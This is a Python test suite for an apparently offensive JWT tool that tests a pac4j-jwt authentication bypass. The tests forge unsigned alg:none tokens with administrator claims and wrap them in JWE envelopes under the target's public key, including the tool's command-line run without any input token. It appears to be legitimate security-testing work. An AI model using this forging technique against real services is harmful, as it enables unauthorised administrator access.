"""PlainJWT-in-JWE attack (CVE-2026-29000, pac4j-jwt JwtAuthenticator bypass).

Known-answer tests: build a JWE for every (alg, enc) combination, decrypt it with
the matching RSA private key, and assert the plaintext is exactly the alg:none
inner token with the tampered claims — i.e. the envelope round-trips. No local
pac4j needed; live validation against the real CVE is done manually.
"""
import base64
import hashlib
import hmac as _hmac
import json
import subprocess
import sys
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec, padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

import tanuki as jf
from tanuki import tanuki as _mod

REPO_ROOT = Path(__file__).resolve().parent.parent


# ── helpers ───────────────────────────────────────────────────────────────────
def _b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _sample_jwt():
    h = jf.encode_segment({"alg": "RS256", "typ": "JWT"})
    p = jf.encode_segment({"sub": "wiener", "role": "user"})
    return jf.JWT(f"{h}.{p}.AAAA")


def _pub_pem(pub):
    return pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode()


def _jwe_decrypt(priv, jwe):
    """Reference JWE decrypt used only to prove the envelope round-trips."""
    parts = jwe.split(".")
    assert len(parts) == 5, "a compact JWE has exactly 5 parts"
    ph_b64, ek_b64, iv_b64, ct_b64, tag_b64 = parts
    header = json.loads(_b64d(ph_b64))
    alg, enc = header["alg"], header["enc"]
    ek, iv, ct, tag = (_b64d(ek_b64), _b64d(iv_b64), _b64d(ct_b64), _b64d(tag_b64))

    if alg == "RSA1_5":
        cek = priv.decrypt(ek, padding.PKCS1v15())
    else:
        h = hashes.SHA256() if alg == "RSA-OAEP-256" else hashes.SHA1()
        cek = priv.decrypt(ek, padding.OAEP(mgf=padding.MGF1(h), algorithm=h, label=None))

    aad = ph_b64.encode("ascii")
    _cek_len, _iv_len, mode = _mod._JWE_ENC_PARAMS[enc]
    if mode == "gcm":
        return AESGCM(cek).decrypt(iv, ct + tag, aad)
    # AES-CBC + HMAC-SHA2 — verify the tag, then decrypt and strip PKCS#7
    half = len(cek) // 2
    mac_key, enc_key = cek[:half], cek[half:]
    al = (len(aad) * 8).to_bytes(8, "big")
    want = _hmac.new(mac_key, aad + iv + ct + al, _mod._JWE_CBC_HASH[enc]).digest()[:half]
    assert _hmac.compare_digest(want, tag), "CBC auth tag mismatch"
    dec = Cipher(algorithms.AES(enc_key), modes.CBC(iv)).decryptor()
    padded = dec.update(ct) + dec.finalize()
    return padded[:-padded[-1]]


@pytest.fixture(scope="module")
def keypair():
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return priv, priv.public_key()


# ── envelope round-trips for every (alg, enc) ──────────────────────────────────
def test_build_jwe_roundtrips_all_combinations(keypair):
    priv, pub = keypair
    plaintext = b"eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0."
    assert len(jf.JWE_KEY_ALGS) * len(jf.JWE_ENCS) == 12
    for alg in jf.JWE_KEY_ALGS:
        for enc in jf.JWE_ENCS:
            jwe = jf.build_jwe(pub, alg, enc, plaintext)
            assert jwe.count(".") == 4, "compact JWE must have 5 parts"
            header = json.loads(_b64d(jwe.split(".")[0]))
            assert header == {"alg": alg, "enc": enc, "cty": "JWT"}   # cty is mandatory
            assert _jwe_decrypt(priv, jwe) == plaintext, "%s/%s did not round-trip" % (alg, enc)


def test_combinations_try_poc_order_first():
    # the public PoC's confirmed combo (RSA-OAEP-256 / A128GCM) is tried first
    assert jf.JWE_KEY_ALGS[0] == "RSA-OAEP-256"
    assert jf.JWE_ENCS[0] == "A128GCM"


# ── the attack wraps the alg:none PlainJWT with the tampered claims ─────────────
def test_attack_wraps_alg_none_with_tampered_claims(keypair):
    priv, pub = keypair
    new_payload = {"sub": "administrator", "role": "admin"}
    results, err = jf.attack_plainjwt_in_jwe(_sample_jwt(), new_payload, _pub_pem(pub))
    assert err is None
    assert len(results) == 12, "one JWE per (alg, enc) combination"
    assert results[0][0] == "JWE RSA-OAEP-256 + A128GCM"   # PoC combo first

    seen_combos = set()
    for label, jwe in results:
        assert label.startswith("JWE ")
        # the envelope carries cty:JWT (the key to reaching pac4j's nested-JWT path)
        assert json.loads(_b64d(jwe.split(".")[0]))["cty"] == "JWT"
        pt = _jwe_decrypt(priv, jwe).decode()
        inner_hdr = json.loads(_b64d(pt.split(".")[0]))
        inner_pl = json.loads(_b64d(pt.split(".")[1]))
        assert inner_hdr == {"alg": "none"}           # unsigned PlainJWT, PoC-exact
        assert pt.endswith("."), "inner token must have an empty signature segment"
        assert inner_pl["sub"] == "administrator" and inner_pl["role"] == "admin"
        # iat + a near-future exp are defaulted in
        assert isinstance(inner_pl["iat"], int) and inner_pl["exp"] > inner_pl["iat"]
        seen_combos.add(label)
    # every combination is distinctly labelled
    assert len(seen_combos) == 12


# ── protected header carries the expected alg/enc ──────────────────────────────
def test_protected_header_alg_enc(keypair):
    _priv, pub = keypair
    jwe = jf.build_jwe(pub, "RSA-OAEP-256", "A256CBC-HS512", b"a.b.")
    parts = jwe.split(".")
    assert len(parts) == 5
    assert json.loads(_b64d(parts[0])) == {
        "alg": "RSA-OAEP-256", "enc": "A256CBC-HS512", "cty": "JWT"}


# ── kid echo + JWKS key selection + iat/exp defaults ───────────────────────────
def test_kid_echoed_into_header(keypair):
    priv, pub = keypair
    jwe = jf.build_jwe(pub, "RSA-OAEP-256", "A128GCM", b"a.b.", kid="enc-key-1")
    header = json.loads(_b64d(jwe.split(".")[0]))
    assert header == {"alg": "RSA-OAEP-256", "enc": "A128GCM", "kid": "enc-key-1",
                      "cty": "JWT"}
    # and via the attack entry point, every combo echoes the kid
    results, err = jf.attack_plainjwt_in_jwe(None, {"sub": "admin"}, _pub_pem(pub),
                                             kid="enc-key-1")
    assert err is None
    for _label, j in results:
        assert json.loads(_b64d(j.split(".")[0]))["kid"] == "enc-key-1"


def _jwk(pub, kid, use):
    nums = pub.public_numbers()
    return {"kty": "RSA", "kid": kid, "use": use,
            "n": jf.b64url_encode(nums.n.to_bytes((nums.n.bit_length() + 7) // 8, "big")),
            "e": jf.b64url_encode(nums.e.to_bytes((nums.e.bit_length() + 7) // 8, "big"))}


def test_jwks_selection_prefers_enc_key(keypair):
    _priv, pub = keypair
    jwks = {"keys": [_jwk(pub, "sig-1", "sig"), _jwk(pub, "enc-key-1", "enc")]}
    # no preference -> first key
    pem, kid = jf.jwks_to_pem_and_kid(jwks)
    assert kid == "sig-1" and "BEGIN PUBLIC KEY" in pem
    # prefer enc -> the encryption key (by use)
    pem, kid = jf.jwks_to_pem_and_kid(jwks, prefer_use="enc")
    assert kid == "enc-key-1"


def test_mint_claims_defaults_iat_exp_but_keeps_explicit():
    claims = _mod._mint_plainjwt_claims({"sub": "admin", "role": "ROLE_ADMIN"})
    assert claims["sub"] == "admin" and claims["role"] == "ROLE_ADMIN"
    assert isinstance(claims["iat"], int) and claims["exp"] > claims["iat"]
    # an explicit exp is preserved, not overwritten
    assert _mod._mint_plainjwt_claims({"exp": 42})["exp"] == 42


# ── error paths: clear skip, no traceback ──────────────────────────────────────
def test_no_public_key_skips_cleanly():
    results, err = jf.attack_plainjwt_in_jwe(_sample_jwt(), {"role": "admin"}, None)
    assert results == []
    assert "public key" in err.lower()
    assert "--pubkey" in err and "--derive-key" in err          # actionable hint


def test_non_rsa_key_errors_cleanly():
    ec_pub = _pub_pem(ec.generate_private_key(ec.SECP256R1()).public_key())
    results, err = jf.attack_plainjwt_in_jwe(_sample_jwt(), {"role": "admin"}, ec_pub)
    assert results == []
    assert "RSA" in err


# ── CLI: --jwe forges the JWEs into the output when a pubkey is supplied ────────
def test_cli_jwe_in_output(tmp_path, keypair):
    _priv, pub = keypair
    pub_file = tmp_path / "pub.pem"
    pub_file.write_text(_pub_pem(pub))
    out_file = tmp_path / "forged.json"
    token = "%s.%s.AAAA" % (jf.encode_segment({"alg": "RS256", "typ": "JWT"}),
                            jf.encode_segment({"sub": "wiener", "role": "user"}))
    proc = subprocess.run(
        [sys.executable, "-m", "tanuki", token, "--pubkey", str(pub_file),
         "--jwe", "--no-crack", "--no-replay", "--claims", "role=admin,sub=administrator",
         "-o", str(out_file), "-q", "--no-color"],
        cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=60,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    data = json.loads(out_file.read_text())
    jwes = [t for t in data["forged_tokens"] if t["attack"] == "plainjwt-in-jwe"]
    assert len(jwes) == 12
    assert all(t["token"].count(".") == 4 for t in jwes)        # all are 5-part JWEs


# ── UNAUTHENTICATED: --jwe with NO input token (the CVE's real shape) ───────────
def test_cli_jwe_no_input_token(tmp_path, keypair):
    priv, pub = keypair
    pub_file = tmp_path / "pub.pem"
    pub_file.write_text(_pub_pem(pub))
    out_file = tmp_path / "forged.json"
    # NOTE: no positional token at all
    proc = subprocess.run(
        [sys.executable, "-m", "tanuki", "--jwe", "--pubkey", str(pub_file),
         "--claims", "sub=administrator,role=admin", "--no-replay",
         "-o", str(out_file), "-q", "--no-color"],
        cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=60,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    data = json.loads(out_file.read_text())
    assert data["input"] is None                                # no input token
    jwes = [t for t in data["forged_tokens"] if t["attack"] == "plainjwt-in-jwe"]
    assert len(jwes) == 12
    # each envelope decrypts to the minted alg:none PlainJWT with the chosen claims
    for t in jwes:
        header = json.loads(_b64d(t["token"].split(".")[0]))
        assert header["cty"] == "JWT"
        pt = _jwe_decrypt(priv, t["token"]).decode()
        inner_hdr = json.loads(_b64d(pt.split(".")[0]))
        inner_pl = json.loads(_b64d(pt.split(".")[1]))
        assert inner_hdr == {"alg": "none"} and pt.endswith(".")
        assert inner_pl["sub"] == "administrator" and inner_pl["role"] == "admin"
        assert "iat" in inner_pl and inner_pl["exp"] > inner_pl["iat"]


def test_cli_jwe_no_token_no_claims_errors():
    # --jwe with no token AND no claims -> clear message, no traceback
    proc = subprocess.run(
        [sys.executable, "-m", "tanuki", "--jwe", "-q", "--no-color"],
        cwd=str(REPO_ROOT), stdin=subprocess.DEVNULL,
        capture_output=True, text=True, timeout=60,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1
    assert "--claims" in out and "Traceback" not in out


def test_cli_jwe_no_token_no_pubkey_errors():
    # claims but no public key -> clear message pointing at --pubkey / JWKS
    proc = subprocess.run(
        [sys.executable, "-m", "tanuki", "--jwe", "--claims", "sub=administrator",
         "-q", "--no-color"],
        cwd=str(REPO_ROOT), stdin=subprocess.DEVNULL,
        capture_output=True, text=True, timeout=60,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1
    assert "public key" in out.lower() and "Traceback" not in out
